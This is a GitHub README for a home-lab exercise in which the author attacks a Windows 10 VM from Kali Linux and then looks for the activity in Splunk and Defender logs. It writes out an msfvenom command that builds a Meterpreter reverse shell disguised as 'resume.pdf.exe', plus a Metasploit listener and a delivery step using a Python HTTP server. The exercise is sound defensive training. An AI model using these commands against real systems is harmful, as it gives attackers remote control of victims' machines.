# Home Lab Attack Simulation & Telemetry Generation
<p>This project was designed as a simulation of a real-world cyberattack, conducted in a virtual lab environment. Its primary goal is to demonstrate how endpoint telemetry can be generated, collected, and analyzed using widely available tools such as Sysmon and Splunk. This project helped me gain hands-on experience with attacker techniques, logging mechanisms, and security monitoring—all of which are essential for working in a SOC environment.</p>

# Prerequisites
<ul>
  <li>Kali Linux – As the attacker machine</li>
  <li>Windows 10 – As the target machine</li>
  <li>Splunk must be installed on the Windows VM.</li>
  <li>Sysmon must be installed using the Splunk Add-on for Sysmon and configured on the Windows VM to generate detailed logs</li>
</ul>

# Simulation
<p>To set up the lab, I used VirtualBox to run two virtual machines: Kali Linux (as the attacker) and Windows 10 (as the target). Both VMs were configured to use an "Internal Network" mode in VirtualBox to ensure isolated communication within the same virtual network. This configuration prevents interaction with the outside internet while allowing both machines to communicate securely.</p>

<p align="center">
    <img src="https://github.com/bagaskarapd/Attack-Simulation/blob/main/Screenshots/%F0%9F%9B%A1%EF%B8%8F%20Home%20Lab%20Attack%20Simulation%20&%20Telemetry%20Generation%20-%20visual%20selection.png?raw=true">
</p>

<p>To ensure stable communication and easier referencing, each virtual machine was assigned a static IP address. Kali Linux was configured with an IP address such as 192.168.56.100, while Windows 10 was assigned 192.168.56.110. These IPs fall within the same subnet and enable consistent access throughout the simulation. This setup ensures that tools like Nmap and Metasploit can reliably interact with the Windows VM during reconnaissance and exploitation.</p>

<p>The simulation begins with reconnaissance. Using Kali Linux, I performed a network scan with Nmap to discover open ports and services on the Windows target.</p>
<pre>
  nmap -A 192.168.56.110 -Pn
</pre>
<p align="center">
    <img src="https://github.com/bagaskarapd/Attack-Simulation/blob/main/Screenshots/Nmap.png?raw=true">
</p>
<ul>
  <p>The scan identified multiple open ports, including:</p>
  <li>135/tcp (Microsoft RPC)</li>
  <li>139/tcp (NetBIOS-SSN)</li>
  <li>445/tcp (Microsoft-DS)</li>
  <li>8000/tcp (Splunkd HTTP interface)</li>
  <li>8089/tcp (Splunkd management port)</li>
</ul>

<p>Next, I used msfvenom to generate a simple Meterpreter reverse shell payload:</p>

<pre>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.100 lport=4444 -f exe -o resume.pdf.exe</pre>

<p>This creates an executable file named resume.pdf.exe that, when executed, will attempt to connect back to the Kali Linux machine on port 4444.</p>

<p align="center">
    <img src="https://github.com/bagaskarapd/Attack-Simulation/blob/main/Screenshots/Msfvenom.png?raw=true">
</p>

<p>I then set up a listener in Metasploit to catch the reverse shell:</p>
<p align="center">
    <img src="https://github.com/bagaskarapd/Attack-Simulation/blob/main/Screenshots/msf6%20exploit.png?raw=true">
</p>
<pre>
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.100
set LPORT 4444
exploit
</pre>

<p>To deliver the payload, I hosted it using a Python HTTP server:</p>

<p align="center">
    <img src="https://github.com/bagaskarapd/Attack-Simulation/blob/main/Screenshots/Hosting%20.png?raw=true">
</p>

<pre>python3 -m http.server 9999</pre>

<p>After disabling Windows Defender for this test, I downloaded and executed the payload on the Windows VM.</p>

<p align="center">
    <img src="https://github.com/bagaskarapd/Attack-Simulation/blob/main/Screenshots/download%20malicious.png?raw=true">
</p>


<p>I confirmed the reverse connection using the following command:</p>
<pre>netstat -anob</pre>

<p>
The result clearly showed an ESTABLISHED connection between the Windows machine and the Kali attacker machine on port 4444, with the process name resume.pdf.exe. This confirmed that the payload had successfully executed and connected back to the attacker:
</p>

<p align="center">
    <img src="https://github.com/bagaskarapd/Attack-Simulation/blob/main/Screenshots/netstat.png?raw=true">
</p>

<p>To further validate this, I opened Task Manager and found that resume.pdf.exe was indeed running under the expected PID. This allowed me to correlate the netstat entry with a live process</p>

<p align="center">
    <img src="https://github.com/bagaskarapd/Attack-Simulation/blob/main/Screenshots/Taskmgr%201128%20PID.png?raw=true">
</p>

<p>Initially, I expected Sysmon which was already installed and configured on the Windows machine to begin recording detailed logs, including process creation, command-line activity, and network connections. However, I noticed that Sysmon data wasn't showing up in Splunk. When I ran the following query:</p>

<pre>index=endpoint | stats count by sourcetype</pre>

<p>
  Sysmon was missing from the results, and only default event logs such as Application, Security, System, PowerShell, and Windows Defender appeared:
</p>

<p>Despite this, Splunk was still able to receive logs from Microsoft Defender. I verified this using the following query:</p>
<pre>
  index=endpoint resume.pdf.exe EventCode=1116
</pre>

<p align="center">
    <img src="https://github.com/bagaskarapd/Attack-Simulation/blob/main/Screenshots/queries2.png?raw=true">
</p>

<p>
  This query returned a log entry showing that Windows Defender had detected the payload as Trojan:Win64/Meterpreter.AMTB with a severity of "Severe." The log showed the payload was downloaded via HTTP from the attacker machine and included detailed file paths and process information:
</p>

# Conclusion
<p>This simulation gave me the chance to walk through a complete attacker-to-defender scenario using tools like Kali Linux, Metasploit, and Splunk. Although I faced a challenge with Sysmon logs not appearing in Splunk, the project still delivered valuable insights through Defender alerts, PID correlation, and network activity analysis. This experience reaffirmed the importance of thorough configuration in log collection and showed me how even partial telemetry can support meaningful detection. Moving forward, I aim to revisit and refine my Sysmon setup to enhance visibility, enabling deeper investigations using process tree analysis and command-line auditing. The lessons learned here reflect my determination to grow and adapt as a future SOC Analyst.</p>
